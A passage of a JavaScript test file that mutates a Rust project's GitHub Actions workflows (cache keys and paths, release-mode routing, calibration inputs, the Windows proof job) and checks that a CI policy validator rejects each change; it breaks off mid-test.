    ["packaged dependency cache escapes isolation", packagedFile, workflow => {
      draftStep(packagedJob(workflow), "Restore Cargo dependency inputs")
        .with.path = "~/.cargo/registry\n~/.cargo/git";
    }, /dependency cache must be exact-input-only and exclude compiler output/u],
    ["packaged dependency cache loses its bound", packagedFile, workflow => {
      delete workflow.env.CARGO_DEPENDENCY_CACHE_MAX_BYTES;
    }, /must pin bounded compiler and dependency caches/u],
    ["packaged Windows compiler cache loses its mixed-workload bound", packagedFile, workflow => {
      workflow.env.WINDOWS_SCCACHE_CACHE_SIZE = "1G";
    }, /must pin bounded compiler and dependency caches/u],
    ["source invalidation loses Cargo.lock", sourceFile, workflow => {
      sourceIdentity(workflow).run = sourceIdentity(workflow).run
        .replace("--lock-file Cargo.lock", "--lock-file Cargo.toml");
    }, /source-proof\.yml must compute one reusable compiler compatibility contract/u],
    ["source invalidation loses Cargo config", sourceFile, workflow => {
      sourceIdentity(workflow).run = sourceIdentity(workflow).run
        .replace("--cargo-config .cargo/config.toml", "--cargo-config Cargo.toml");
    }, /source-proof\.yml must compute one reusable compiler compatibility contract/u],
    ["source invalidation loses feature set", sourceFile, workflow => {
      sourceIdentity(workflow).run = sourceIdentity(workflow).run
        .replace(
          "--features workspace-test-default-and-clippy-all-targets-all-features",
          "--features default",
        );
    }, /source-proof\.yml must compute one reusable compiler compatibility contract/u],
    ["source invalidation loses workspace manifests", sourceFile, workflow => {
      sourceIdentity(workflow).run = sourceIdentity(workflow).run
        .replace("git ls-files '*Cargo.toml'", "printf '%s\\n' Cargo.toml");
    }, /source-proof\.yml must compute one reusable compiler compatibility contract/u],
    ["packaged invalidation loses Rust version", packagedFile, workflow => {
      packagedIdentity(workflow).run = packagedIdentity(workflow).run
        .replace('--rust-version "$rust_version"', "--rust-release ignored");
    }, /packaged-platform-proof\.yml must compute one complete reusable compiler compatibility contract/u],
    ["packaged invalidation loses target", packagedFile, workflow => {
      packagedIdentity(workflow).run = packagedIdentity(workflow).run
        .replace('--target "${{ matrix.rust_target }}"', "--architecture ignored");
    }, /packaged-platform-proof\.yml must compute one complete reusable compiler compatibility contract/u],
    ["packaged invalidation loses feature set", packagedFile, workflow => {
      packagedIdentity(workflow).run = packagedIdentity(workflow).run
        .replace("--features codestory-cli-default-features", "--features default");
    }, /packaged-platform-proof\.yml must compute one complete reusable compiler compatibility contract/u],
    ["packaged invalidation loses native toolchain", packagedFile, workflow => {
      packagedIdentity(workflow).run = packagedIdentity(workflow).run
        .replace('--native-toolchain "$native_toolchain"', "--toolchain ignored");
    }, /packaged-platform-proof\.yml must compute one complete reusable compiler compatibility contract/u],
    ["packaged invalidation loses generator", packagedFile, workflow => {
      packagedIdentity(workflow).run = packagedIdentity(workflow).run
        .replace('--generator "$generator"', "--build-system ignored");
    }, /packaged-platform-proof\.yml must compute one complete reusable compiler compatibility contract/u],
    ["packaged invalidation loses CMake", packagedFile, workflow => {
      packagedIdentity(workflow).run = packagedIdentity(workflow).run
        .replace('--cmake-version "$cmake_version"', "--cmake ignored");
    }, /packaged-platform-proof\.yml must compute one complete reusable compiler compatibility contract/u],
    ["packaged invalidation loses Ninja", packagedFile, workflow => {
      packagedIdentity(workflow).run = packagedIdentity(workflow).run
        .replace('--ninja-version "$ninja_version"', "--ninja ignored");
    }, /packaged-platform-proof\.yml must compute one complete reusable compiler compatibility contract/u],
    ["packaged invalidation loses Cargo.lock", packagedFile, workflow => {
      packagedIdentity(workflow).run = packagedIdentity(workflow).run
        .replace("--lock-file Cargo.lock", "--lock-file Cargo.toml");
    }, /packaged-platform-proof\.yml must compute one complete reusable compiler compatibility contract/u],
    ["packaged invalidation loses Cargo config", packagedFile, workflow => {
      packagedIdentity(workflow).run = packagedIdentity(workflow).run
        .replace("--cargo-config .cargo/config.toml", "--cargo-config Cargo.toml");
    }, /packaged-platform-proof\.yml must compute one complete reusable compiler compatibility contract/u],
    ["packaged invalidation loses workspace manifests", packagedFile, workflow => {
      packagedIdentity(workflow).run = packagedIdentity(workflow).run
        .replace("git ls-files '*Cargo.toml'", "printf '%s\\n' Cargo.toml");
    }, /packaged-platform-proof\.yml must compute one complete reusable compiler compatibility contract/u],
    ["packaged invalidation loses Windows native installer", packagedFile, workflow => {
      packagedIdentity(workflow).run = packagedIdentity(workflow).run
        .replace(".github/scripts/install-windows-vulkan-sdk.ps1", "ignored-windows-input");
    }, /packaged-platform-proof\.yml must compute one complete reusable compiler compatibility contract/u],
    ["packaged invalidation loses Linux Dockerfile", packagedFile, workflow => {
      packagedIdentity(workflow).run = packagedIdentity(workflow).run
        .replace(".github/docker/linux-glibc-build.Dockerfile", ".github/docker/ignored.Dockerfile");
    }, /packaged-platform-proof\.yml must compute one complete reusable compiler compatibility contract/u],
    ["packaged invalidation loses Linux glslc inputs", packagedFile, workflow => {
      packagedIdentity(workflow).run = packagedIdentity(workflow).run
        .replace(".github/docker/glslc", ".github/docker/ignored-glslc");
    }, /packaged-platform-proof\.yml must compute one complete reusable compiler compatibility contract/u],
    ["packaged invalidation loses Linux build image", packagedFile, workflow => {
      packagedIdentity(workflow).run = packagedIdentity(workflow).run
        .replace("LINUX_GLIBC_BUILD_IMAGE", "UNPINNED_BUILD_IMAGE");
    }, /packaged-platform-proof\.yml must compute one complete reusable compiler compatibility contract/u],
    ["packaged invalidation loses Linux glslc image", packagedFile, workflow => {
      packagedIdentity(workflow).run = packagedIdentity(workflow).run
        .replace("LINUX_GLSLC_IMAGE", "UNPINNED_GLSLC_IMAGE");
    }, /packaged-platform-proof\.yml must compute one complete reusable compiler compatibility contract/u],
    ["packaged workload variants collide", packagedFile, workflow => {
      packagedIdentity(workflow).run = packagedIdentity(workflow).run
        .replace('--identity "qualification_driver=$qualification_driver"', "--workload ignored");
    }, /packaged-platform-proof\.yml must compute one complete reusable compiler compatibility contract/u],
    ["source compiler cache waits for tests", sourceFile, workflow => {
      moveNamedStepAfter(
        sourceJob(workflow),
        "Save compiler objects after compilation",
        "Test the complete workspace once",
      );
    }, /source-proof\.yml compiler cache must save before test execution or release-cell failure/u],
    ["packaged compiler cache waits for protected regression", packagedFile, workflow => {
      moveNamedStepAfter(
        packagedJob(workflow),
        "Save compiler objects after compilation",
        "Test immutable native staging on Windows",
      );
    }, /compiler cache must save before late Test immutable native staging on Windows failure/u],
    ["packaged compiler cache waits for signing", packagedFile, workflow => {
      moveNamedStepAfter(
        packagedJob(workflow),
        "Save compiler objects after compilation",
        "Sign and notarize macOS CLI",
      );
    }, /compiler cache must save before late Sign and notarize macOS CLI failure/u],
    ["packaged compiler cache waits for packaging", packagedFile, workflow => {
      moveNamedStepAfter(
        packagedJob(workflow),
        "Save compiler objects after compilation",
        "Package release asset",
      );
    }, /compiler cache must save before late Package release asset failure/u],
    ["packaged compile timer includes cache uploads", packagedFile, workflow => {
      moveNamedStepAfter(
        packagedJob(workflow),
        "Stop compilation clock",
        "Save compiler objects after compilation",
      );
    }, /compile and compiler-cache-save timings must cover only their named stages/u],
    ["source compile telemetry omits its end boundary", sourceFile, workflow => {
      const report = draftStep(sourceJob(workflow), "Report compiler cache save");
      report.run = report.run.replace('--ended-ms "$ENDED_MS" \\\n', "");
    }, /step Report compiler cache save must run --ended-ms/u],
    ["source cache restores Cargo target output", sourceFile, workflow => {
      const restore = draftStep(sourceJob(workflow), "Restore compatible compiler objects");
      restore.with.path += "\ntarget";
    }, /source-proof\.yml cache paths must exclude Cargo target and exact proof outputs/u],
    ["packaged cache restores release-dist", packagedFile, workflow => {
      const restore = draftStep(packagedJob(workflow), "Restore compatible compiler objects");
      restore.with.path += "\nrelease-dist";
    }, /packaged-platform-proof\.yml cache paths must exclude Cargo target, native seeds, models, proofs, and exact archives/u],
    ["packaged cache restores an exact archive", packagedFile, workflow => {
      const restore = draftStep(packagedJob(workflow), "Restore compatible compiler objects");
      restore.with.path += "\n/tmp/codestory-linux-x64.tar.gz";
    }, /packaged-platform-proof\.yml cache paths must exclude Cargo target, native seeds, models, proofs, and exact archives/u],
    ["packaged cache saves proof output", packagedFile, workflow => {
      const save = draftStep(packagedJob(workflow), "Save compiler objects after compilation");
      save.with.path += "\ntarget/notarization-proof";
    }, /packaged-platform-proof\.yml cache paths must exclude Cargo target, native seeds, models, proofs, and exact archives/u],
    ["package dispatch mode is removed", coordinatorFile, workflow => {
      workflow.on.workflow_dispatch.inputs.mode.options
        = workflow.on.workflow_dispatch.inputs.mode.options.filter(mode => mode !== "package");
    }, /packaged-platform-pr\.yml dispatch modes changed/u],
    ["package mode skips archive construction", coordinatorFile, workflow => {
      workflow.jobs["packaged-proof"].if = workflow.jobs["packaged-proof"].if
        .replace("needs.route.outputs.mode == 'package' || ", "");
    }, /package and platform modes must build fresh archives while only qualification runs the cold Linux boundary/u],
    ["package mode enables frozen Linux qualification", coordinatorFile, workflow => {
      workflow.jobs["packaged-proof"].with.hermetic_linux = true;
    }, /package and platform modes must build fresh archives while only qualification runs the cold Linux boundary/u],
    ["qualification mode disables frozen Linux qualification", coordinatorFile, workflow => {
      workflow.jobs["packaged-proof"].with.hermetic_linux = false;
    }, /package and platform modes must build fresh archives while only qualification runs the cold Linux boundary/u],
    ["platform mode enables frozen Linux qualification", coordinatorFile, workflow => {
      workflow.jobs["packaged-proof"].with.hermetic_linux
        = "${{ needs.route.outputs.mode == 'platform' }}";
    }, /package and platform modes must build fresh archives while only qualification runs the cold Linux boundary/u],
    ["package mode enables protected Metal proof", coordinatorFile, workflow => {
      workflow.jobs["macos-metal-proof"].if = workflow.jobs["macos-metal-proof"].if
        .replace("needs.route.outputs.mode != 'package' &&", "");
    }, /package-only mode must skip protected Metal proof/u],
    ["package mode enables protected Windows proof", coordinatorFile, workflow => {
      workflow.jobs["windows-vulkan-proof"].if = workflow.jobs["windows-vulkan-proof"].if
        .replace("needs.route.outputs.mode != 'package' &&", "");
    }, /package-only mode must skip protected Windows proof/u],
    ["package mode enables protected Linux proof", coordinatorFile, workflow => {
      workflow.jobs["linux-vulkan-proof"].if = workflow.jobs["linux-vulkan-proof"].if
        .replace("needs.route.outputs.mode != 'package' &&", "");
    }, /package-only mode must skip protected Linux proof/u],
    ["calibration mode enables frozen Linux qualification", coordinatorFile, workflow => {
      workflow.jobs["calibration-linux"].with.hermetic_linux = true;
    }, /hosted Linux calibration must call packaged proof in calibration mode/u],
    ["coordinator adds a macOS source hard gate", coordinatorFile, workflow => {
      workflow.jobs["macos-source"] = {
        "runs-on": "macos-14",
        steps: [],
      };
    }, /packaged-platform-pr\.yml standard coordinator must not add a macOS source hard gate/u],
    ["package matrix repeats frozen Linux qualification", packagedFile, workflow => {
      packagedJob(workflow).steps.push(structuredClone(draftStep(
        workflow.jobs["frozen-linux-qualification"],
        "Prove fresh-target Node-absent network-denied Cargo release boundary",
      )));
    }, /matrix package jobs must not repeat the frozen Linux Cargo boundary/u],
    ["frozen Linux qualification becomes unconditional", packagedFile, workflow => {
      workflow.jobs["frozen-linux-qualification"].if = "always()";
    }, /frozen Linux Cargo boundary must be one explicit post-package job/u],
    ["frozen Linux qualification restores exact archives", packagedFile, workflow => {
      workflow.jobs["frozen-linux-qualification"].steps.push({
        name: "Restore exact package archive",
        uses: "actions/cache/restore@v5",
        with: {
          path: "release-dist/codestory-linux-x64.tar.gz",
          key: "forbidden-exact-archive",
        },
      });
    }, /frozen Linux fresh-target qualification must not restore compiler output/u],
    ["Linux compiler cache exits with an active server", packagedFile, workflow => {
      const build = draftStep(packagedJob(workflow), "Build Linux x64 at the glibc 2.31 baseline");
      build.run = build.run.replace("/sccache/sccache --stop-server", "true");
    }, /step Build Linux x64 at the glibc 2\.31 baseline must run \/sccache\/sccache --stop-server/u],
    ["package checkout accepts a fallback SHA", packagedFile, workflow => {
      draftStep(packagedJob(workflow), "Checkout").with.ref = "${{ inputs.ref || github.sha }}";
    }, /package jobs must checkout only the requested exact SHA/u],
    ["package smoke loses source identity", packagedFile, workflow => {
      const smoke = draftStep(packagedJob(workflow), "Smoke packaged release asset");
      smoke.run = smoke.run.replace(
        '--expected-source-sha "${{ steps.source-identity.outputs.sha }}" \\\n',
        "",
      );
    }, /step Smoke packaged release asset must run --expected-source-sha/u],
    ["fresh package identity is reported after upload", packagedFile, workflow => {
      moveNamedStepAfter(
        packagedJob(workflow),
        "Report fresh package identity",
        "Upload release asset",
      );
    }, /must report a verified fresh archive identity before upload/u],
    ["release repeats frozen Linux qualification", releaseFile, workflow => {
      workflow.jobs["packaged-proof"].with.hermetic_linux = true;
    }, /release\.yml main release must not repeat frozen-candidate Linux qualification/u],
  ];

  for (const [name, file, mutate, expectedReason] of mutations) {
    await t.test(name, () => {
      const workflows = loadWorkflows();
      mutate(workflows.get(file));
      assert.match(validateWorkflows(workflows).join("\n"), expectedReason);
    });
  }
});

test("standard release paths reject calibration plumbing", async (t) => {
  assert.deepEqual(validateWorkflows(loadWorkflows()), []);

  const mutations = [
    ["auto-release forwards calibration", workflows => {
      workflows.get("auto-release.yml").jobs.release.with.calibration_bundle_artifact
        = "${{ vars.CODESTORY_CALIBRATION_BUNDLE_ARTIFACT }}";
    }, /auto-release\.yml standard release path must not reference calibration/u],
    ["release accepts calibration input", workflows => {
      workflows.get("release.yml").on.workflow_call.inputs.calibration_bundle_artifact = {
        required: true,
        type: "string",
      };
    }, /release\.yml standard release path must not reference calibration/u],
    ["release forwards calibration to package proof", workflows => {
      workflows.get("release.yml").jobs["packaged-proof"].with.calibration_bundle_run_id
        = "${{ inputs.calibration_bundle_run_id }}";
    }, /release\.yml standard release path must not reference calibration/u],
    ["post-publish proof receives calibration", workflows => {
      const step = draftStep(
        workflows.get("post-publish-release-smoke.yml").jobs.smoke,
        "Prove the catalog-resolved published runtime",
      );
      step.run += '\n--calibration-bundle "$calibration_bundle"';
    }, /post-publish-release-smoke\.yml standard release path must not reference calibration/u],
    ["accelerator cell claims calibration identity", workflows => {
      const step = draftStep(
        workflows.get("macos-metal-proof.yml").jobs["packaged-metal"],
        "Emit authenticated Metal release cell",
      );
      step.run += "\ncalibration_sha256=forged";
    }, /must not run calibration/u],
  ];

  for (const [name, mutate, expectedReason] of mutations) {
    await t.test(name, () => {
      const workflows = loadWorkflows();
      mutate(workflows);
      assert.match(validateWorkflows(workflows).join("\n"), expectedReason);
    });
  }
});

test("Cargo lock policy reads executable step commands", () => {
  const workflow = parseWorkflow(`
on: { workflow_dispatch: null }
permissions: { contents: read }
jobs:
  check:
    timeout-minutes: 5
    steps:
      - run: |
          # cargo test --workspace
          cargo test --workspace --locked
`);
  assert.deepEqual(basicWorkflowViolations("fixture.yml", workflow), []);

  workflow.jobs.check.steps[0].run += "\ncargo check --workspace\n";
  assert.match(basicWorkflowViolations("fixture.yml", workflow).join("\n"), /must use --locked/u);
});

test("draft source cache reuse preserves exact serial proof structure", async (t) => {
  assert.deepEqual(draftSourcePolicyViolations(draftSourceJob(), retrievalSourceJob()), []);

  const mutations = [
    ["unversioned primary", job => {
      const step = draftStep(job, "Restore Cargo inputs and output");
      step.with.key = step.with.key.replace("-draft-v2-", "-draft-");
    }],
    ["lock-only primary", job => {
      const step = draftStep(job, "Restore Cargo inputs and output");
      step.with.key = step.with.key.replace(`${cacheManifestIdentity}-`, "");
    }],
    ["mismatched proof topology", job => {
      const step = draftStep(job, "Restore Cargo inputs and output");
      step.with.key = step.with.key.replace(proofTopology, proofTopology.replace("-v1-", "-v2-"));
    }],
    ["fallback order reversal", job => {
      const step = draftStep(job, "Restore Cargo inputs and output");
      step.with["restore-keys"] = step.with["restore-keys"].trim().split("\n").reverse().join("\n");
    }],
    ["overbroad draft fallback", job => {
      const step = draftStep(job, "Restore Cargo inputs and output");
      const keys = step.with["restore-keys"].trim().split("\n");
      keys[1] = "${{ runner.os }}-draft-v2-";
      step.with["restore-keys"] = keys.join("\n");
    }],
    ["cross-platform fallback", job => {
      const step = draftStep(job, "Restore Cargo inputs and output");
      step.with["restore-keys"] = step.with["restore-keys"].replace("${{ runner.os }}-cargo-stable-", "Windows-cargo-stable-");
    }],
    ["all-feature fallback", job => {
      const step = draftStep(job, "Restore Cargo inputs and output");
      step.with["restore-keys"] = step.with["restore-keys"].replace("-default-features-", "-all-features-");
    }],
    ["source-proof fallback", job => {
      const step = draftStep(job, "Restore Cargo inputs and output");
      step.with["restore-keys"] = step.with["restore-keys"].replace("-retrieval-contracts-", "-source-proof-");
    }],
    ["manifest-free prior retrieval fallback", job => {
      const step = draftStep(job, "Restore Cargo inputs and output");
      const keys = step.with["restore-keys"].trim().split("\n");
      keys[2] = keys[2].replace(`${cacheManifestIdentity}-`, "");
      step.with["restore-keys"] = keys.join("\n");
    }],
    ["target-free prior draft fallback", job => {
      const step = draftStep(job, "Restore Cargo inputs and output");
      const keys = step.with["restore-keys"].trim().split("\n");
      keys[1] = keys[1].replace("-${{ steps.rust-cache-key.outputs.target }}-", "-");
      step.with["restore-keys"] = keys.join("\n");
    }],
    ["different restore path", job => {
      const step = draftStep(job, "Restore Cargo inputs and output");
      step.with.path = step.with.path.replace("target", "target/release");
    }],
    ["blocking restore", job => {
      draftStep(job, "Restore Cargo inputs and output")["continue-on-error"] = false;
    }],
    ["matched-key save", job => {
      draftStep(job, "Save Cargo inputs and output").with.key = "${{ steps.cargo-cache-restore.outputs.cache-matched-key }}";
    }],
    ["promotion before complete proof", job => {
      draftStep(job, "Save Cargo inputs and output").if = "steps.cargo-cache-restore.outputs.cache-hit != 'true'";
    }],
    ["removed proof command", job => {
      const step = draftStep(job, "Prove focused publication contracts");
      step.run = step.run.trim().split("\n").slice(0, -1).join("\n");
    }],
    ["reordered proof commands", job => {
      const step = draftStep(job, "Prove focused publication contracts");
      const commands = step.run.trim().split("\n");
      [commands[0], commands[1]] = [commands[1], commands[0]];
      step.run = commands.join("\n");
    }],
    ["backgrounded Cargo command", job => {
      const step = draftStep(job, "Check the workspace");
      step.run = `${step.run} &`;
    }],
    ["parallel Cargo commands", job => {
      const step = draftStep(job, "Check the workspace");
      step.run = `${step.run} &\nwait`;
    }],
    ["reordered proof steps", job => {
      const left = job.steps.findIndex(step => step.name === "Check the workspace");
      const right = job.steps.findIndex(step => step.name === "Lint workspace libraries");
      [job.steps[left], job.steps[right]] = [job.steps[right], job.steps[left]];
    }],
    ["optional proof step", job => {
      draftStep(job, "Lint workspace libraries")["continue-on-error"] = true;
    }],
    ["decoy cache step", job => {
      const restore = draftStep(job, "Restore Cargo inputs and output");
      const decoy = structuredClone(restore);
      decoy.name = "Decoy cache contract";
      restore.with.key = "decoy-primary";
      job.steps.push(decoy);
    }],
  ];

  for (const [name, mutate] of mutations) {
    await t.test(name, () => {
      const candidate = draftSourceJob();
      mutate(candidate);
      assert.notDeepEqual(draftSourcePolicyViolations(candidate, retrievalSourceJob()), []);
    });
  }

  for (const [name, mutate] of [
    ["shortened producer timeout", job => {
      job["timeout-minutes"] = 30;
    }],
    ["incompatible retrieval path", job => {
      draftStep(job, "Restore Cargo registry, git sources, and build output").with.path = "~/.cargo/registry\ntarget/retrieval\n";
    }],
    ["incompatible retrieval key", job => {
      const step = draftStep(job, "Restore Cargo registry, git sources, and build output");
      step.with.key = step.with.key.replace("-default-features-", "-all-features-");
    }],
    ["mismatched retrieval topology version", job => {
      const step = draftStep(job, "Restore Cargo registry, git sources, and build output");
      step.with.key = step.with.key.replace(proofTopology, proofTopology.replace("-v1-", "-v2-"));
    }],
    ["manifest-free retrieval key", job => {
      const step = draftStep(job, "Restore Cargo registry, git sources, and build output");
      step.with.key = step.with.key.replace(`${cacheManifestIdentity}-`, "");
    }],
    ["incompatible retrieval action", job => {
      draftStep(job, "Restore Cargo registry, git sources, and build output").uses = "actions/cache/restore@v4";
    }],
    ["omitted seed target", job => {
      const step = draftStep(job, "Seed draft proof test-profile artifacts");
      step.run = step.run.trim().split("\n").slice(1).join("\n");
    }],
    ["reordered seed targets", job => {
      const step = draftStep(job, "Seed draft proof test-profile artifacts");
      const commands = step.run.trim().split("\n");
      [commands[0], commands[1]] = [commands[1], commands[0]];
      step.run = commands.join("\n");
    }],
    ["executable seed target", job => {
      const step = draftStep(job, "Seed draft proof test-profile artifacts");
      step.run = step.run.replace(" --no-run", "");
    }],
    ["optional seed step", job => {
      draftStep(job, "Seed draft proof test-profile artifacts")["continue-on-error"] = true;
    }],
    ["save before seed", job => {
      const seed = job.steps.findIndex(step => step.name === "Seed draft proof test-profile artifacts");
      const save = job.steps.findIndex(step => step.name === "Save Cargo registry, git sources, and build output");
      [job.steps[seed], job.steps[save]] = [job.steps[save], job.steps[seed]];
    }],
    ["producer matched-key save", job => {
      draftStep(job, "Save Cargo registry, git sources, and build output").with.key = "${{ steps.cargo-cache-restore.outputs.cache-matched-key }}";
    }],
  ]) {
    await t.test(name, () => {
      const candidate = retrievalSourceJob();
      mutate(candidate);
      assert.notDeepEqual(draftSourcePolicyViolations(draftSourceJob(), candidate), []);
    });
  }
});

test("retrieval cache producer triggers cover every draft manifest consumer", async (t) => {
  assert.deepEqual(retrievalProducerTriggerPolicyViolations(retrievalSourceWorkflow()), []);

  const reordered = retrievalSourceWorkflow();
  reordered.on.pull_request.paths.reverse();
  reordered.on.push.paths.reverse();
  assert.deepEqual(
    retrievalProducerTriggerPolicyViolations(reordered),
    [],
    "required trigger membership is order-insensitive",
  );

  const requiredPaths = [
    "crates/**/Cargo.toml",
    "vendor/**/Cargo.toml",
    ".github/workflows/rust-ci.yml",
  ];
  for (const event of ["pull_request", "push"]) {
    for (const requiredPath of requiredPaths) {
      await t.test(`${event} rejects removal of ${requiredPath}`, () => {
        const candidate = retrievalSourceWorkflow();
        candidate.on[event].paths = candidate.on[event].paths
          .filter(triggerPath => triggerPath !== requiredPath);
        assert.notDeepEqual(retrievalProducerTriggerPolicyViolations(candidate), []);
        const workflows = loadWorkflows();
        workflows.set(retrievalFile, candidate);
        assert.match(
          validateWorkflows(workflows).join("\n"),
          /retrieval cache producer .* paths must cover/u,
        );
      });
    }
  }

  await t.test("push must retain the dev branch", () => {
    const candidate = retrievalSourceWorkflow();
    candidate.on.push.branches = candidate.on.push.branches
      .filter(branch => branch !== "dev/codestory-next");
    assert.notDeepEqual(retrievalProducerTriggerPolicyViolations(candidate), []);
    const workflows = loadWorkflows();
    workflows.set(retrievalFile, candidate);
    assert.match(
      validateWorkflows(workflows).join("\n"),
      /retrieval cache producer must run on dev\/codestory-next pushes/u,
    );
  });
});

test("Windows manifest-missing proof freezes routing, native topology, and exact cache identity", async (t) => {
  assert.deepEqual(windowsManifestProofPolicyViolations(windowsManifestWorkflow()), []);

  const keyStep = workflow => windowsManifestStep(
    workflow,
    "Restore Windows Cargo inputs and output",
  );
  const proofStep = workflow => windowsManifestStep(
    workflow,
    "Prove Windows ready_command manifest-missing contract",
  );
  const saveStep = workflow => windowsManifestStep(
    workflow,
    "Save Windows Cargo inputs and output",
  );
  const installerHash = "${{ hashFiles('.github/scripts/install-windows-vulkan-sdk.ps1') }}";
  const lockHash = "${{ hashFiles('Cargo.lock') }}";

  const mutations = [
    ["cloned Windows job routed on pull requests", workflow => {
      const clone = structuredClone(windowsManifestJob(workflow));
      clone.if = "github.event_name == 'pull_request'";
      clone["continue-on-error"] = true;
      workflow.jobs["windows-manifest-decoy"] = clone;
    }, /must contain exactly linux-contracts and windows-manifest-missing jobs/u],
    ["top-level build target", workflow => {
      workflow.env = { CARGO_BUILD_TARGET: "x86_64-pc-windows-gnu" };
    }, /must not define top-level env/u],
    ["top-level shell default", workflow => {
      workflow.defaults = { run: { shell: "bash" } };
    }, /must not define top-level defaults/u],
    ["top-level working-directory default", workflow => {
      workflow.defaults = { run: { "working-directory": "crates/codestory-cli" } };
    }, /must not define top-level defaults/u],
    ["pull request omits installer", workflow => {
      workflow.on.pull_request.paths = workflow.on.pull_request.paths
        .filter(triggerPath => triggerPath !== ".github/scripts/install-windows-vulkan-sdk.ps1");
    }],
    ["push omits installer", workflow => {
      workflow.on.push.paths = workflow.on.push.paths
        .filter(triggerPath => triggerPath !== ".github/scripts/install-windows-vulkan-sdk.ps1");
    }],
    ["dispatch inputs", workflow => {
      workflow.on.workflow_dispatch = { inputs: { ref: { required: false, type: "string" } } };
    }],
    ["pull-request job routing", workflow => {
      windowsManifestJob(workflow).if = "github.event_name == 'pull_request'";
    }],
    ["label routing", workflow => {
      windowsManifestJob(workflow).if = "contains(github.event.pull_request.labels.*.name, 'proof')";
    }],
    ["older runner", workflow => {
      windowsManifestJob(workflow)["runs-on"] = "windows-2022";
    }],
    ["longer timeout", workflow => {
      windowsManifestJob(workflow)["timeout-minutes"] = 60;
    }],
    ["CPU permission removed", workflow => {
      delete windowsManifestJob(workflow).env.CODESTORY_EMBED_ALLOW_CPU;
    }],
    ["CPU permission disabled", workflow => {
      windowsManifestJob(workflow).env.CODESTORY_EMBED_ALLOW_CPU = "0";
    }],
    ["native generator removed", workflow => {
      delete windowsManifestJob(workflow).env.CMAKE_GENERATOR;
    }],
    ["native generator changed to Visual Studio", workflow => {
      windowsManifestJob(workflow).env.CMAKE_GENERATOR = "Visual Studio 18 2026";
    }],
    ["native generator moved to proof-step override", workflow => {
      delete windowsManifestJob(workflow).env.CMAKE_GENERATOR;
      proofStep(workflow).env = { CMAKE_GENERATOR: "Ninja" };
    }],
    ["extra product feature environment", workflow => {
      windowsManifestJob(workflow).env.CARGO_FEATURES = "cpu-only";
    }],
    ["job made optional", workflow => {
      windowsManifestJob(workflow)["continue-on-error"] = true;
    }],
    ["checkout alternate ref", workflow => {
      windowsManifestJob(workflow).steps[0].with = { ref: "main" };
    }],
    ["installer removed", workflow => {
      windowsManifestJob(workflow).steps = windowsManifestJob(workflow).steps
        .filter(step => step.name !== "Install checksum-pinned Windows Vulkan SDK");
    }],
    ["installer replaced", workflow => {
      windowsManifestStep(workflow, "Install checksum-pinned Windows Vulkan SDK").run = "choco install vulkan-sdk";
    }],
    ["installer made optional", workflow => {
      windowsManifestStep(workflow, "Install checksum-pinned Windows Vulkan SDK")["continue-on-error"] = true;
    }],
    ["installer moved after proof", workflow => {
      const job = windowsManifestJob(workflow);
      const installer = job.steps.findIndex(step => step.name === "Install checksum-pinned Windows Vulkan SDK");
      const proof = job.steps.findIndex(step => step.name === "Prove Windows ready_command manifest-missing contract");
      [job.steps[installer], job.steps[proof]] = [job.steps[proof], job.steps[installer]];
    }],
    ["CMake cache identity capture removed", workflow => {
      const identity = windowsManifestStep(workflow, "Capture Rust cache identity");
      identity.run = identity.run.replace(/.*cmake.*\n/gu, "");
    }],
    ["Ninja cache identity capture removed", workflow => {
      const identity = windowsManifestStep(workflow, "Capture Rust cache identity");
      identity.run = identity.run.replace(/.*ninja.*\n/gu, "");
    }],
    ["unversioned proof topology", workflow => {
      keyStep(workflow).with.key = keyStep(workflow).with.key
        .replace(/ready-command-v2-[0-9a-f]{64}/u, "ready-command");
    }],
    ["stale proof topology", workflow => {
      keyStep(workflow).with.key = keyStep(workflow).with.key
        .replace("ready-command-v2-", "ready-command-v1-");
    }],
    ["generator-free cache", workflow => {
      keyStep(workflow).with.key = keyStep(workflow).with.key
        .replace("-generator-ninja", "");
    }],
    ["CMake-free cache", workflow => {
      keyStep(workflow).with.key = keyStep(workflow).with.key
        .replace("-cmake-${{ steps.rust-cache-key.outputs.cmake }}", "");
    }],
    ["Ninja-free cache", workflow => {
      keyStep(workflow).with.key = keyStep(workflow).with.key
        .replace("-ninja-${{ steps.rust-cache-key.outputs.ninja }}", "");
    }],
    ["OS-free cache", workflow => {
      keyStep(workflow).with.key = keyStep(workflow).with.key.replace("${{ runner.os }}-", "");
    }],
    ["Rust-free cache", workflow => {
      keyStep(workflow).with.key = keyStep(workflow).with.key
        .replace("-${{ steps.rust-cache-key.outputs.version }}", "");
    }],
    ["target-free cache", workflow => {
      keyStep(workflow).with.key = keyStep(workflow).with.key
        .replace("-${{ steps.rust-cache-key.outputs.target }}", "");
    }],
    ["all-feature cache", workflow => {
      keyStep(workflow).with.key = keyStep(workflow).with.key
        .replace("-default-features-", "-all-features-");
    }],
    ["manifest-free cache", workflow => {
      keyStep(workflow).with.key = keyStep(workflow).with.key
        .replace(`${cacheManifestIdentity}-`, "");
    }],
    ["installer-free cache", workflow => {
      keyStep(workflow).with.key = keyStep(workflow).with.key.replace(`${installerHash}-`, "");
    }],
    ["lock-free cache", workflow => {
      keyStep(workflow).with.key = keyStep(workflow).with.key.replace(lockHash, "unlocked");
    }],
    ["fallback cache prefix", workflow => {
      keyStep(workflow).with["restore-keys"] = "Windows-cargo-stable-";
    }],
    ["alternate cache output", workflow => {
      keyStep(workflow).with.path = "target/windows";
    }],
    ["cache restore bypass", workflow => {
      keyStep(workflow).if = "always()";
    }],
    ["unlocked proof", workflow => {
      proofStep(workflow).run = proofStep(workflow).run.replace(" --locked", "");
    }],
    ["supplied-binary substitute", workflow => {
      proofStep(workflow).run = "cargo test --locked -p codestory-cli --test ready_command --features supplied-binary";
    }],
    ["proof made optional", workflow => {
      proofStep(workflow)["continue-on-error"] = true;
    }],
    ["save before proof", workflow => {
      const job = windowsManifestJob(workflow);
      const proof = job.steps.findIndex(step => step.name === "Prove Windows ready_command manifest-missing contract");
      const save = job.steps.findIndex(step => step.name === "Save Windows Cargo inputs and output");
      [job.steps[proof], job.steps[save]] = [job.steps[save], job.steps[proof]];
    }],
    ["save after failed proof", workflow => {
      saveStep(workflow).if = "steps.cargo-cache-restore.outputs.cache-hit != 'true'";
    }],
    ["save exact hit", workflow => {
      saveStep(workflow).if = "success()";
    }],
    ["save matched key", workflow => {
      saveStep(workflow).with.key = "${{ steps.cargo-cache-restore.outputs.cache-matched-key }}";
    }],
    ["save fallback input", workflow => {
      saveStep(workflow).with["restore-keys"] = "Windows-cargo-stable-";
    }],
    ["decoy proof", workflow => {
